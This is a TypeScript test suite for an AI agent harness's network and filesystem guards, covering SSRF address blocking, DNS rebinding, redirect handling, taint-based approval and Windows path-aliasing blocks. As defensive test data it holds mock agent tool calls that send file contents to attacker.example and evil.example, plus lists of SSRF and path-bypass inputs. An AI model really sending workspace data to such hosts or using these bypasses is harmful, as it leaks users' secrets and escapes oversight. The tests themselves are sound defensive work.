import assert from "node:assert/strict";
import { mkdirSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { join } from "node:path";
import { describe, it } from "node:test";
import { MockProvider } from "../src/core/models/mock.ts";
import type { Tool } from "../src/core/tools.ts";
import { DEFAULT_RULES, PolicyEngine } from "../src/core/policy.ts";
import { parseCriterion } from "../src/core/verify.ts";
import { WorkspaceGuard } from "../src/node/fs-guard.ts";
import { isPrivateAddress, safeFetch } from "../src/node/net-guard.ts";
import { httpTools } from "../src/node/tools/http-tools.ts";
import { finishReply, harness, planReply, tempDir, toolReply } from "./helpers.ts";

const isWin = process.platform === "win32";

describe("IPv6 / transition-range SSRF bypasses are closed", () => {
  it("blocks IPv4 hidden inside IPv6 (mapped hex form, NAT64, 6to4, compatible) and non-global ranges", () => {
    for (const ip of [
      "::ffff:7f00:1", // hex-form mapped 127.0.0.1
      "::ffff:127.0.0.1",
      "::ffff:a9fe:a9fe", // 169.254.169.254
      "64:ff9b::7f00:1", // NAT64 -> 127.0.0.1
      "64:ff9b::a9fe:a9fe",
      "64:ff9b:1::1", // local-use NAT64
      "2002:7f00:1::1", // 6to4 -> 127.0.0.1
      "2002:a9fe:a9fe::1",
      "::7f00:1", // IPv4-compatible
      "fec0::1", // site-local
      "fc00::1",
      "fe80::1%eth0",
      "ff02::1",
      "2001:db8::1", // documentation
      "2001::1", // Teredo
      "100::1",
      "::",
      "::1",
      "not-an-ip",
    ]) {
      assert.equal(isPrivateAddress(ip), true, ip);
    }
    for (const ip of ["2606:4700:4700::1111", "2001:4860:4860::8888", "::ffff:8.8.8.8", "64:ff9b::808:808", "2002:808:808::1", "8.8.8.8"]) {
      assert.equal(isPrivateAddress(ip), false, ip);
    }
    for (const ip of ["198.18.0.1", "192.0.2.1", "198.51.100.7", "203.0.113.9", "255.255.255.255"]) assert.equal(isPrivateAddress(ip), true, ip);
  });
});

describe("DNS rebinding: addresses are validated when the socket connects", () => {
  it("a hostname that resolves to loopback is refused by the connect-time lookup (real sockets)", async () => {
    let hits = 0;
    const server = createServer((_q, r) => (hits++, r.end("secret")));
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    const port = (server.address() as { port: number }).port;
    // The pre-flight check is bypassed on purpose: only the pinned transport stands between us and the server.
    await assert.rejects(
      safeFetch(`http://rebind.example:${port}/`, { resolver: async () => [{ address: "127.0.0.1", family: 4 }] }),
      /private address/,
    );
    assert.equal(hits, 0, "no request reached the internal server");
    server.close();
  });

  it("a hostname that first looks public then flips to private is still refused", async () => {
    let n = 0;
    const flip = async () => (n++ === 0 ? [{ address: "93.184.216.34", family: 4 }] : [{ address: "10.0.0.5", family: 4 }]);
    const fetchImpl = (async () => new Response(null, { status: 302, headers: { location: "http://rebind.example/second" } })) as typeof fetch;
    await assert.rejects(safeFetch("http://rebind.example/first", { fetchImpl, resolver: flip }), /private/);
  });
});

describe("Redirects never replay a POST body to an unapproved host", () => {
  it("POST 307 is returned, not followed", async () => {
    const seen: string[] = [];
    const fetchImpl = (async (u: string | URL) => {
      seen.push(String(u));
      return new Response(null, { status: 307, headers: { location: "https://evil.example/collect" } });
    }) as typeof fetch;
    const r = await safeFetch("https://api.example/submit", { method: "POST", body: "secret", fetchImpl, skipDns: true });
    assert.equal(r.status, 307);
    assert.match(r.text, /not followed/);
    assert.deepEqual(seen, ["https://api.example/submit"]);
  });
});

describe("Resource caps cannot be defeated by a slow or endless response (real sockets)", () => {
  const loopback = async () => [{ address: "127.0.0.1", family: 4 }];

  it("a slow-drip response (never idle, never finishes) is cut off by the total wall-clock timeout", async () => {
    const server = createServer((_q, r) => {
      r.writeHead(200);
      const t = setInterval(() => r.write("x"), 50);
      r.on("close", () => clearInterval(t));
    });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    const port = (server.address() as { port: number }).port;
    const started = Date.now();
    await assert.rejects(safeFetch(`http://drip.example:${port}/`, { timeoutMs: 400, resolver: loopback, testAllowPrivate: true }));
    const took = Date.now() - started;
    assert.ok(took >= 300 && took < 2500, `aborted by the total timer, took ${took} ms`);
    server.closeAllConnections();
    server.close();
  });

  it("stops downloading and closes the connection once the size cap is reached", async () => {
    let written = 0;
    let closed = false;
    const server = createServer((_q, r) => {
      r.writeHead(200);
      const t = setInterval(() => {
        written += 10_000;
        r.write("y".repeat(10_000));
      }, 5);
      r.on("close", () => {
        closed = true;
        clearInterval(t);
      });
    });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    const port = (server.address() as { port: number }).port;
    const out = await safeFetch(`http://big.example:${port}/`, { maxBytes: 1000, timeoutMs: 5000, resolver: loopback, testAllowPrivate: true });
    assert.equal(out.truncated, true);
    assert.equal(out.text.length, 1000);
    await new Promise((r) => setTimeout(r, 100));
    assert.equal(closed, true, "the client hung up instead of draining the stream");
    assert.ok(written < 1_000_000, `server was stopped early (wrote ${written})`);
    server.closeAllConnections();
    server.close();
  });
});

describe("Approval summaries show what will really be sent", () => {
  it("includes the full URL with query and a body preview, and truncates visibly", () => {
    const [get, post] = httpTools();
    const g = get!.assess({ url: "https://example.com/p?token=abc123&x=1" });
    assert.match(g.summary, /token=abc123/);
    assert.equal(g.exfilRisk, true);
    assert.equal(get!.assess({ url: "https://example.com/p" }).exfilRisk, undefined);
    const p = post!.assess({ url: "https://example.com/hook?k=v", body: "x".repeat(500) });
    assert.match(p.summary, /k=v/);
    assert.match(p.summary, /body\(500 chars\)/);
    assert.match(p.summary, /\[\+\d+ chars\]/);
  });
});

describe("Auto-allowed network reads cannot become an exfiltration channel", () => {
  const policy = new PolicyEngine(DEFAULT_RULES);
  const plain = { risk: "network_read" as const, summary: "", resources: [] };

  it("plain GET is allowed; a query string, or any GET after reading workspace content, needs approval", () => {
    assert.equal(policy.evaluate({ tool: "http.get", assessment: plain }).effect, "allow");
    assert.equal(policy.evaluate({ tool: "http.get", assessment: { ...plain, exfilRisk: true } }).effect, "ask");
    assert.equal(policy.evaluate({ tool: "http.get", assessment: plain, tainted: true }).effect, "ask");
    assert.equal(policy.evaluate({ tool: "http.get", assessment: { ...plain, violation: "private" }, tainted: true }).effect, "deny");
  });

  it("end to end: a task that read a file cannot silently GET attacker.example/?d=<file contents>", async () => {
    const m = new MockProvider("m", [
      planReply(),
      toolReply("fs.read", { path: "secret.txt" }),
      toolReply("http.get", { url: "https://attacker.example/collect" }), // no query, but the task is tainted
      finishReply(),
    ]);
    const h = harness({ providers: [m] });
    writeFileSync(join(h.workspace, "secret.txt"), "hunter2");
    const t = await h.engine.submit({ goal: "summarise" });
    await h.engine.runTask(t.id);
    const saved = (await h.store.getTask(t.id))!;
    assert.equal(saved.status, "WAITING_FOR_APPROVAL", "the request waits for the owner instead of leaving the machine");
    const [a] = await h.store.listApprovals("pending");
    assert.match(a!.summary, /attacker\.example/);
    h.cleanup();
  });

  it("taint also covers directory listings and sandbox output, not just fs.read", async () => {
    for (const first of [toolReply("fs.list", { path: "." }), toolReply("sandbox.exec", { image: "alpine:3.20", command: ["true"] })]) {
      const m = new MockProvider("m", [planReply(), first, toolReply("http.get", { url: "https://attacker.example/x" }), finishReply()]);
      // allow sandbox.exec so the test reaches the network step
      const h = harness({ providers: [m], rules: [{ tool: "*", effect: "allow" }] });
      const t = await h.engine.submit({ goal: "go" });
      await h.engine.runTask(t.id);
      const saved = (await h.store.getTask(t.id))!;
      assert.equal(saved.status, "WAITING_FOR_APPROVAL", `after ${JSON.parse(first).tool} the GET must wait`);
      h.cleanup();
    }
  });

  it("taint is based on output shown to the model, not on the tool reporting success", async () => {
    const leaky: Tool = {
      name: "test.leaky",
      description: "fails but prints workspace text",
      argsHint: "{}",
      exposesWorkspaceData: true,
      assess: () => ({ risk: "read", summary: "leaky", resources: [] }),
      run: async () => ({ ok: false, output: "partial contents of secret.txt: hunter2" }),
    };
    const m = new MockProvider("m", [planReply(), toolReply("test.leaky", {}), toolReply("http.get", { url: "https://attacker.example/x" }), finishReply()]);
    const h = harness({ providers: [m] });
    h.tools.register(leaky);
    const t = await h.engine.submit({ goal: "go" });
    await h.engine.runTask(t.id);
    const saved = (await h.store.getTask(t.id))!;
    assert.equal(saved.steps[0]!.ok, false);
    assert.equal(saved.steps[0]!.executed, true);
    assert.equal(saved.status, "WAITING_FOR_APPROVAL", "a failing tool that printed workspace text still taints the task");
    h.cleanup();
  });

  it("a step the policy denied never ran, so it does not taint", async () => {
    const m = new MockProvider("m", [planReply(), toolReply("fs.read", { path: "../outside.txt" }), toolReply("http.get", { url: "https://example.com/" }), finishReply("ok")]);
    const h = harness({ providers: [m] });
    const t = await h.engine.submit({ goal: "go" });
    await h.engine.runTask(t.id);
    const saved = (await h.store.getTask(t.id))!;
    assert.equal(saved.steps[0]!.executed, false);
    assert.equal(saved.status, "COMPLETED", "plain GET was still allowed: nothing workspace-derived was shown");
    h.cleanup();
  });

  it("model-proposed http_status criteria are rejected (they would fetch a model-chosen URL outside policy)", () => {
    assert.equal(parseCriterion({ kind: "http_status", url: "https://evil.example/?d=secret", status: 200 }, "model"), null);
    assert.ok(parseCriterion({ kind: "http_status", url: "https://example.com/", status: 200 }, "user"));
  });
});

describe("Protected directories cannot be reached through Windows path aliasing", () => {
  it("rejects trailing dots/spaces, alternate data streams and short-name patterns, and canonicalises case", { skip: isWin ? false : "Windows path rules" }, () => {
    const { dir, cleanup } = tempDir();
    mkdirSync(join(dir, ".aeon"));
    const g = new WorkspaceGuard(dir);
    for (const bad of [".aeon./aeon.db", ".aeon /aeon.db", ".aeon::$DATA", ".AEON~1/aeon.db", ".git./config", "GIT~1/config", ".AEON/aeon.db", "sub/../.aeon/aeon.db", ".aeon\\aeon.db"]) {
      assert.equal(g.resolve(bad).ok, false, `should block ${JSON.stringify(bad)}`);
    }
    assert.equal(g.resolve("normal/file.txt").ok, true);
    assert.equal(g.resolve("name.with.dots.txt").ok, true);
    cleanup();
  });

  it("the protected-name check also applies on the canonical path (case variants everywhere)", () => {
    const { dir, cleanup } = tempDir();
    const g = new WorkspaceGuard(dir);
    for (const bad of [".Aeon/x", ".GIT/x", "./.aeon/../.aeon/x"]) assert.equal(g.resolve(bad).ok, false, bad);
    cleanup();
  });
});
